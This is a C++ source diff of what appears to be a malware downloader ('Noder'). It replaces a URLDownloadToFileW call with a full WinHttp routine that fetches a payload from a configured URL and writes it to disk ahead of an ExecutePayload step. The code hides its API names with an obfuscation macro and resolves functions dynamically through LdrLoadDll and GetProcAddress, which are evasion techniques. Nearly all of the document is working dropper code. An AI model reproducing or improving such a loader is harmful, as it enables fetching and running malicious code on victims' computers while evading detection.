@@ -1,6 +1,7 @@
 #include <iostream>
 #include <filesystem>
 #include <windows.h>
+#include <winhttp.h>
 
 #include "obfuscation.h"
 #include "definitions.h"
@@ -30,7 +31,6 @@ Noder::~Noder()
 	if (this->LdrUnloadDll == NULL)
 		return;
 
-	this->LdrUnloadDll(this->urlmon);
 	this->LdrUnloadDll(this->ntdll);
 }
 
@@ -41,10 +41,17 @@ void Noder::Init() noexcept
 	this->LdrGetProcedureAddressForCaller = NULL;
 	this->RtlInitUnicodeString = NULL;
 	this->RtlInitAnsiString = NULL;
-	this->URLDownloadToFileW = NULL;
+	this->WinHttpOpen = NULL;
+	this->WinHttpConnect = NULL;
+	this->WinHttpOpenRequest = NULL;
+	this->WinHttpSendRequest = NULL;
+	this->WinHttpReceiveResponse = NULL;
+	this->WinHttpQueryDataAvailable = NULL;
+	this->WinHttpReadData = NULL;
+	this->WinHttpCloseHandle = NULL;
 
 	this->ntdll = NULL;
-	this->urlmon = NULL;
+	this->winhttp = NULL;
 
 	//
 	// Set payload name and path
@@ -65,6 +72,7 @@ void Noder::Init() noexcept
 
 bool Noder::LoadLibraries() noexcept
 {
+
 	HMODULE tempNtdll = (HMODULE)GetModuleHandleW(OBF(wchar_t, L"ntdll.dll"));
 
 	f_LdrLoadDll tempLdrLoadDll = (f_LdrLoadDll)GetProcAddress(tempNtdll, OBF(char, "LdrLoadDll"));
@@ -80,12 +88,12 @@ bool Noder::LoadLibraries() noexcept
 	}
 	this->ntdll = hTemp;
 
-	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"urlmon.dll"));
+	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"winhttp.dll"));
 	if (tempLdrLoadDll(NULL, 0x0, &usTemp, &hTemp) != 0x0)
 	{
 		return false;
 	}
-	this->urlmon = hTemp;
+	this->winhttp = hTemp;
 
 	return true;
 }
@@ -104,18 +112,109 @@ bool Noder::LoadFunctions() noexcept
 	if (this->RtlInitUnicodeString == NULL)
 		return false;
 
-	this->URLDownloadToFileW = (f_URLDownloadToFileW)GetProcAddress(this->urlmon, OBF(char, "URLDownloadToFileW"));
-	if (this->URLDownloadToFileW == NULL)
+	this->WinHttpOpen = (f_WinHttpOpen)GetProcAddress(this->winhttp, OBF(char, "WinHttpOpen"));
+	if (this->WinHttpOpen == NULL)
 		return false;
 
+	this->WinHttpConnect = (f_WinHttpConnect)GetProcAddress(this->winhttp, OBF(char, "WinHttpConnect"));
+	if (this->WinHttpConnect == NULL)
+		return false;
 
+	this->WinHttpOpenRequest = (f_WinHttpOpenRequest)GetProcAddress(this->winhttp, OBF(char, "WinHttpOpenRequest"));
+	if (this->WinHttpOpenRequest == NULL)
+		return false;
+
+	this->WinHttpSendRequest = (f_WinHttpSendRequest)GetProcAddress(this->winhttp, OBF(char, "WinHttpSendRequest"));
+	if (this->WinHttpSendRequest == NULL)
+		return false;
+
+	this->WinHttpReceiveResponse = (f_WinHttpReceiveResponse)GetProcAddress(this->winhttp, OBF(char, "WinHttpReceiveResponse"));
+	if (this->WinHttpReceiveResponse == NULL)
+		return false;
+
+	this->WinHttpQueryDataAvailable = (f_WinHttpQueryDataAvailable)GetProcAddress(this->winhttp, OBF(char, "WinHttpQueryDataAvailable"));
+	if (this->WinHttpQueryDataAvailable == NULL)
+		return false;
+
+	this->WinHttpReadData = (f_WinHttpReadData)GetProcAddress(this->winhttp, OBF(char, "WinHttpReadData"));
+	if (this->WinHttpReadData == NULL)
+		return false;
+
+	this->WinHttpCloseHandle = (f_WinHttpCloseHandle)GetProcAddress(this->winhttp, OBF(char, "WinHttpCloseHandle"));
+	if (this->WinHttpCloseHandle == NULL)
+		return false;
 
 	return true;
 }
 
 bool Noder::DownloadPayload() noexcept
 {
-	return (this->URLDownloadToFileW(NULL, PAYLOAD_LINK, this->destination.c_str(), 0, NULL)) == S_OK;
+	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+	bool bStatus, retVal = false;
+
+	hSession = this->WinHttpOpen(PAYLOAD_USER_AGENT,
+		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS, 0);
+
+	if(hSession)
+		hConnect = this->WinHttpConnect(hSession, PAYLOAD_URL,
+			INTERNET_DEFAULT_HTTPS_PORT, 0);
+
+	if(hConnect)
+		hRequest = this->WinHttpOpenRequest(hConnect, OBF(wchar_t, L"GET"),
+			PAYLOAD_URL_DEST,
+			NULL, WINHTTP_NO_REFERER,
+			WINHTTP_DEFAULT_ACCEPT_TYPES,
+			WINHTTP_FLAG_SECURE);
+
+	bStatus = this->WinHttpSendRequest(hRequest,
+		WINHTTP_NO_ADDITIONAL_HEADERS,
+		0, WINHTTP_NO_REQUEST_DATA, 0,
+		0, 0);
+
+	if(bStatus)
+		bStatus = this->WinHttpReceiveResponse(hRequest, NULL);
+
+	HANDLE hFile = NULL;
+	if (bStatus)
+	{
+		DWORD size = 0;
+		LPBYTE buffer;
+		DWORD downloaded = 0;
+		hFile = CreateFileW(this->destination.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+		do {
+			size = 0;
+			this->WinHttpQueryDataAvailable(hRequest, &size);
+
+			buffer = new byte[size + 1];
+
+			if (!buffer)
+				size = 0;
+			else
+			{
+				RtlZeroMemory(buffer, size + 1);
+				if (this->WinHttpReadData(hRequest, (LPVOID)buffer, size, &downloaded))
+				{
+					DWORD written;
+					WriteFile(hFile, buffer, size, &written, NULL);
+					retVal = true;
+				}
+
+				delete[] buffer;
+			}
+
+		} while (size > 0);
+
+		CloseHandle(hFile);
+	}
+
+	if (hRequest) this->WinHttpCloseHandle(hRequest);
+	if (hConnect) this->WinHttpCloseHandle(hConnect);
+	if (hSession) this->WinHttpCloseHandle(hSession);
+
+	return retVal;
 }
 
 void Noder::ExecutePayload() noexcept
